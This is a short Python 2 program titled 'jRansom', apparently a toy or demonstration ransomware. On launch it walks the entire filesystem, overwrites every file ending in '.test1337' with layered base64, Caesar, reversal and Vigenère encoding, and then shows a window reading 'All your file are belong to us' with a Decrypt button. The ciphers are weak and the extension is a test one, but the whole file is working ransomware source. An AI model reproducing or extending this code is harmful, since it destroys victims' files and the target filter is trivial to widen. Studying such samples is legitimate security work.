import os
import base64
from Tkinter import *
from caesarCipher import *
from reverseCipher import *
from vigenereCipher import *

def encrypt():
    for root, dirs, files in os.walk('/'):
        for file in files:
            if file.endswith('.test1337'):
                print(os.path.join(root, file))
                #open file in read/write binary mode
                f = open(os.path.join(root, file),"rb+")
                #store file contents in the contents variable
                contents = f.read()
                #encoding data in base64 to allow running text-only ciphers on other datatypes
                contents = contents.encode("base64")
                #adding padding to ensure we're at a multiple of 4 characters and avoid decoding errors later
                contents += "=" * ((4 - len(contents) % 4) % 4)
                #encrypting data with caesar cipher
                contents = caesartranslate(contents, 3, "encrypt")
                #reversing the result of the caesar cipher
                contents = reverse(contents)
                #encrypting data with vigenere cipher
                contents = vtranslate(contents, file, "encrypt")
                #resetting pointer position to the start of the file
                f.seek(0)
                #truncating file to 0 length to remove old information
                f.truncate(0)
                #writing encrypted file contents
                f.write(contents)
                #closing file to avoid linux file access limit
                f.close()

def decrypt():
    for root, dirs, files in os.walk('/'):
        for file in files:
            if file.endswith('.test1337'):
                print(os.path.join(root, file))
                #all encrypted data will be in plaintext, so we only open in read/write text mode for decrypting
                f = open(os.path.join(root, file),"r+")
                #store file contents in the contents variable
                contents = f.read()
                #decrypting data with vigenere cipher
                contents = vtranslate(contents, file, "decrypt")
                #reversing the result of the vigenere decryption
                contents = reverse(contents)
                #decrypting data with caesar cipher
                contents = caesartranslate(contents, 3, "decrypt")
                #decoding base64 string back into original data
                contents = base64.b64decode(contents)
                #resetting pointer position to the start of the file
                f.seek(0)
                #truncating file to 0 length to remove old information
                f.truncate(0)
                #writing decrypted file contents
                f.write(contents)
                #closing file to avoid linux file access limit
                f.close()

class UI:
    def __init__(self, master):
        self.master = master
        master.title("jRansom")

        self.label = Label(master, text="All your file are belong to us")
        self.label.pack()

        self.decrypt_button = Button(master, text="Decrypt", command=decrypt)
        self.decrypt_button.pack()

        self.close_button = Button(master, text="Close", command=master.quit)
        self.close_button.pack()

encrypt()

root = Tk()
my_gui = UI(root)
root.mainloop()